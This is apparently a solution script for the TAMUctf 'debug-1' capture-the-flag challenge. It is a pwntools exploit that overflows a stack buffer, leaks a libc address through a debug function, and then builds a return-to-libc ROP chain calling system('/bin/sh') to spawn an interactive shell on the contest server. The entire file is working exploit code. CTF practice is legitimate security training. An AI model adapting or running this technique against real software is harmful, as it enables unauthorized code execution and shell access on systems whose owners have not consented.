#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./debug-1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.28.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tamuctf.com", 443, ssl=True, sni="tamuctf_debug-1")

    return r


def main():
    r = conn()  
    rop = ROP(exe)
    rop.raw(b"\x00" * 88)
    # rop.raw(0x0000000000401016)
    rop.raw(exe.sym['debug'] + 1)
    r.sendline("1")
    r.sendline(rop.chain())
    r.sendline("1")
    r.recvuntil(b"libc leak: ")
    system = int(r.recvline().strip().decode(),16)
    libc.address = system - libc.sym['system']
    rdi = 0x000000000040154b
    bin_sh = next(libc.search("/bin/sh"))
    log.info(f"System address : {hex(system)}")
    log.info(f"Libc base : {hex(libc.address)}")
    rop2 = ROP(libc)
    rop2.raw(b"A" * 104)
    rop2.raw(rdi)
    rop2.raw(bin_sh)
    rop2.raw(0x0000000000401016)
    rop2.raw(libc.sym['system'])
    time.sleep(10)
    print(rop2.dump())
    r.sendline(rop2.chain())
    r.interactive()

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
